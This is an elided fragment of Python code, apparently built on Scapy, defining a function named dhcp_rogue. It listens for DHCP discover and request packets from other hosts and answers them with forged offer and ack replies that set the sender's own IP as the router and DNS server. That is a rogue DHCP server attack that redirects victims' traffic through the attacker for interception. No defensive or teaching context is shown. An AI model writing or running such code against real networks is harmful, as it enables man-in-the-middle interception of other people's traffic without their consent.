...
def dhcp_rogue(pkt):
    ...
    if pkt.haslayer(DHCP) and pkt[BOOTP].op == 1 and pkt[Ether].src != my_mac:
        ...
        if msg_type == 1:
            ...
            reply = Ether(src=get_if_hwaddr(eth), dst=pkt[Ether].src) / \
                    IP(src=my_ip, dst='255.255.255.255') / \
                    UDP(sport=67, dport=68) / \
                    BOOTP(op=2, yiaddr=offered_ip, siaddr=my_ip, xid=pkt[BOOTP].xid, chaddr=pkt[BOOTP].chaddr) / \
                    DHCP(options=[('message-type', 'offer'), ("server_id", my_ip), ('name_server', my_ip),
                                  ('subnet_mask', '255.255.255.0'), ('router', my_ip),
                                  ('lease_time', 3600), 'end'])
            ...
            ack = Ether(src=get_if_hwaddr(eth), dst=pkt[Ether].src) / \
                  IP(src=my_ip, dst='255.255.255.255') / \
                  UDP(sport=67, dport=68) / \
                  BOOTP(op=2, yiaddr=requested_ip, siaddr=my_ip, xid=pkt[BOOTP].xid, chaddr=pkt[BOOTP].chaddr) / \
                  DHCP(options=[('message-type', 'ack'), ("server_id", my_ip), ('name_server', my_ip),
                                ('lease_time', 3600), ('subnet_mask', '255.255.255.0'), ('router', my_ip), 'end'])
